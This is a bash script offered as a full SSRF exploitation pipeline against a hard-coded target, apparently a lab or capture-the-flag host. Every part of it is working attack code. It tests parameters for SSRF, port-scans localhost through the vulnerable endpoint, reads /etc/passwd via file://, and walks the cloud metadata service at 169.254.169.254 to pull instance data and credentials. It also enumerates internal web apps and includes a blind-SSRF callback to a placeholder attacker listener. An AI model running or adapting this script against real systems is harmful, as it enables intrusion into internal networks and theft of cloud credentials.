#!/bin/bash
# ssrf_attack_suite.sh
# Full SSRF exploitation pipeline

TARGET="http://10.10.120.144:1337/admin"
PARAMS=(url path next data link target redirect dest)
LOCAL_IP="127.0.0.1"
METADATA_IP="169.254.169.254"
COMMON_PORTS=(80 443 8000 8080 3000 5000 8888)

banner() {
    echo -e "\n========== $1 =========="
}

detect_ssrf() {
    banner "Step 1: SSRF Parameter Detection"
    for PARAM in "${PARAMS[@]}"; do
        CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=http://$LOCAL_IP")
        echo "  [+] Testing '$PARAM' → HTTP $CODE"
    done
}

scan_ports() {
    banner "Step 2: Internal Port Scan via SSRF"
    for PORT in $(seq 1 100); do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?url=http://$LOCAL_IP:$PORT")
        [[ "$RESPONSE" != "000" ]] && echo "  [+] $LOCAL_IP:$PORT seems open (HTTP $RESPONSE)"
    done
}

read_files() {
    banner "Step 3: Attempting to Read Local Files (/etc/passwd)"
    curl -s "$TARGET?url=file:///etc/passwd" || echo "  [-] File read failed or blocked"
}

cloud_metadata() {
    banner "Step 4: Cloud Metadata (AWS-style)"
    curl -s "$TARGET?url=http://$METADATA_IP/latest/meta-data/" | while read -r line; do
        echo "  [+] Found metadata path: $line"
        CONTENT=$(curl -s "$TARGET?url=http://$METADATA_IP/latest/meta-data/$line")
        echo "      $CONTENT"
    done
}

enumerate_internal_web() {
    banner "Step 5: Scan Internal Web Apps"
    for PORT in "${COMMON_PORTS[@]}"; do
        CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?url=http://$LOCAL_IP:$PORT")
        [[ "$CODE" != "000" ]] && echo "  [+] Web app on $LOCAL_IP:$PORT → HTTP $CODE"
    done
}

proxy_request() {
    banner "Step 6: Proxy Request to Internal Endpoint"
    echo "[*] Trying to access http://127.0.0.1:8080/api/status via SSRF..."
    curl -s "$TARGET?url=http://127.0.0.1:8080/api/status" || echo "  [-] Proxying failed"
}

blind_ssrf() {
    banner "Step 7: Blind SSRF Check"
    echo "  [+] Sending request to your listener (modify before running)"
    curl -s "$TARGET?url=http://your-burpcollab-url/ssrf-check"
}

main() {
    detect_ssrf
    scan_ports
    read_files
    cloud_metadata
    enumerate_internal_web
    proxy_request
    # Uncomment if you have a listener:
    # blind_ssrf
}

main
